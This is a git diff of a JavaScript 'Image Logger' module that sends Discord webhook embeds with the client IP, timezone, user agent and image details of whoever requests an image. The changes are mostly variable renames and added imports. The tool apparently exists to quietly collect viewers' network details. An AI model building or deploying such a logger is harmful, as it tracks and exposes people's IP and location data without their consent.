@@ -1,10 +1,13 @@
+const fs = require('fs')
+const path = require('path')
+const axios = require('axios')
 const logger = require('./logger')
 const { WebhookClient, EmbedBuilder } = require('discord.js')
 
 const config = require('./config.json')
 
 const sendImageToWebhooks = (
-  imageName,
+  imageNameWithExtension,
   imagePath,
   clientIP,
   timezone,
@@ -23,7 +26,7 @@ const sendImageToWebhooks = (
   userAgent,
   domain
 ) => {
-  imageName = imageName || 'not found'
+  imageNameWithExtension = imageNameWithExtension || 'not found'
   imagePath = imagePath || 'not found'
   clientIP = clientIP || 'not found'
   timezone = timezone || 'not found'
@@ -45,12 +48,12 @@ const sendImageToWebhooks = (
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
-      .setTitle(`Requesting an **${imageName}** image`)
+      .setTitle(`Requesting an **${imageNameWithExtension}** image`)
       .setURL(domain)
       .setFields([
         {
           name: '🖼️ Image',
-          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imagePath}\`\`\``
+          value: `\`\`\`shell\n🖼️ Name: ${imageNameWithExtension}\n🔗 URL: ${imagePath}\`\`\``
         },
         {
           name: '📡 Network',
@@ -65,7 +68,7 @@ const sendImageToWebhooks = (
           value: `\`\`\`shell\n${userAgent}\`\`\``
         }
       ])
-      .setThumbnail('attachment://' + imageName)
+      .setThumbnail('attachment://' + imageNameWithExtension)
       .setFooter({
         text: 'Image Logger',
         iconURL:
@@ -79,25 +82,31 @@ const sendImageToWebhooks = (
         embeds: [embed]
       })
       .then(() => {
-        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
+        logger.info(
+          `Image ${imageNameWithExtension} sent to webhook ${webhook.name}`
+        )
       })
       .catch(error => {
         logger.error(
-          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
+          `Error sending image ${imageNameWithExtension} to webhook ${webhook.name}: ${error}`
         )
       })
   })
 }
 
-const sendImageToWebhooksGithub = (imageName, imagePath, domain) => {
-  imageName = imageName || 'not found'
+const sendImageToWebhooksGithub = (
+  imageNameWithExtension,
+  imagePath,
+  domain
+) => {
+  imageNameWithExtension = imageNameWithExtension || 'not found'
   imagePath = imagePath || 'not found'
   domain = domain || 'not found'
 
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
-      .setTitle(`Requesting **${imageName}** on GitHub`)
+      .setTitle(`Requesting **${imageNameWithExtension}** on GitHub`)
       .setURL(domain)
       .setAuthor({
         name: 'GitHub',
@@ -107,10 +116,10 @@ const sendImageToWebhooksGithub = (imageName, imagePath, domain) => {
       .setFields([
         {
           name: '🖼️ Image',
-          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imagePath}\`\`\``
+          value: `\`\`\`shell\n🖼️ Name: ${imageNameWithExtension}\n🔗 URL: ${imagePath}\`\`\``
         }
       ])
-      .setThumbnail('attachment://' + imageName)
+      .setThumbnail('attachment://' + imageNameWithExtension)
       .setFooter({
         text: 'Image Logger',
         iconURL:
@@ -124,11 +133,13 @@ const sendImageToWebhooksGithub = (imageName, imagePath, domain) => {
         embeds: [embed]
       })
       .then(() => {
-        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
+        logger.info(
+          `Image ${imageNameWithExtension} sent to webhook ${webhook.name}`
+        )
       })
       .catch(error => {
         logger.error(
-          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
+          `Error sending image ${imageNameWithExtension} to webhook ${webhook.name}: ${error}`
         )
       })
   })
